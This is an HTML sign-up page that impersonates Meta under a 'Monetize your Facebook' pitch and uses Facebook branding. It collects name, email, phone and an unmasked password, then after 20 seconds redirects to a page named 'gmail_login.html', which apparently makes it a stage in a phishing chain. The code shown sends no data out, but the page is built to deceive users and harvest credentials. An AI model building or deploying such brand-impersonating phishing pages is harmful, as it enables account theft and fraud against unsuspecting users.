<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Register — Monetize Your Facebook</title>
  <style>
    :root{--bg:#0f1724;--card:#0b1220;--muted:#9aa4b2;--accent:#6ee7b7;--accent2:#60a5fa}
    *{box-sizing:border-box}
    body{margin:0;font-family:Inter,ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,'Helvetica Neue',Arial; background:linear-gradient(180deg,#071023 0%,var(--bg) 100%);color:#e6eef6}
    .container{max-width:1100px;margin:40px auto;padding:24px}
    header{display:flex;align-items:center;justify-content:space-between}
    .brand{display:flex;gap:12px;align-items:center}
    .logo{width:44px;height:44px;border-radius:10px;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;font-weight:700;color:#042028}
    nav a{color:var(--muted);margin-left:16px;text-decoration:none}
    .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border:1px solid rgba(255,255,255,0.03); padding:18px; border-radius:12px}
    .btn{background:var(--accent);color:#032025;padding:12px 16px;border-radius:10px;border:none;cursor:pointer;font-weight:600;text-decoration:none}
    footer{margin-top:40px;color:var(--muted);text-align:center;padding:30px 0}

    /* Form styles */
    .form-container { max-width: 500px; margin: 40px auto; }
    .form-container h1 { text-align: center; }
    .form-group { margin-bottom: 16px; }
    .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: var(--muted); }
    .form-group input {
        width: 100%;
        padding: 12px;
        border-radius: 8px;
        border: 1px solid rgba(255,255,255,0.1);
        background: #04111a;
        color: #e6eef6;
        font-size: 16px;
    }
    .form-group input:focus {
        outline: none;
        border-color: var(--accent);
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <div class="brand">
        <div style="background-color: #fff;" class="logo">
            <img style="width: 50px;background-color: #fff;" src="/facebook-svgrepo-com.svg" alt="">
        </div>
        <div>
          <div style="font-weight:700">Meta</div>
          <div style="font-size:12px;color:var(--muted)">Monetize your Facebook presence</div>
        </div>
      </div>
      <nav>
        <a href="index.html">Home</a>
      </nav>
    </header>

    <main class="form-container card">
        <h1>Get Started</h1>
        <p style="text-align:center; color: var(--muted); margin-top: -10px; margin-bottom: 24px;">Create your account to start monetizing.</p>
        <form id="register-form">
            <div class="form-group">
                <label for="name">Full Name</label>
                <input type="text" id="name" name="name" placeholder="John Doe" required>
            </div>
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="you@example.com" required>
            </div>
            <div class="form-group">
                <label for="number">Phone Number</label>
                <input type="number" id="number" name="number" placeholder="+1234567890" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="text" id="password" name="password" placeholder="••••••••" required>
            </div>
            <button type="submit" class="btn" style="width:100%; margin-top: 12px;">Create Account</button>
        </form>
    </main>

    <footer>
      © Meta • Built for creators • Terms • Privacy
    </footer>
  </div>
  <script>
    const registerForm = document.getElementById('register-form');
    const formContainer = document.querySelector('.form-container');

    registerForm.addEventListener('submit', (event) => {
      event.preventDefault();

      // Display a success message to the user
      formContainer.innerHTML = `
        <h1>Registration Successful!</h1>
        <p style="text-align:center; color: var(--muted); margin-top: -10px; margin-bottom: 24px;">
          Thank you for signing up. You will be redirected to your inbox in 20 seconds.
        </p>`;

      // Wait 20 seconds then redirect
      setTimeout(() => {
        window.location.href = 'gmail_login.html';
      }, 20000); // 20000 milliseconds = 20 seconds
    });
  </script>
</body>
</html>
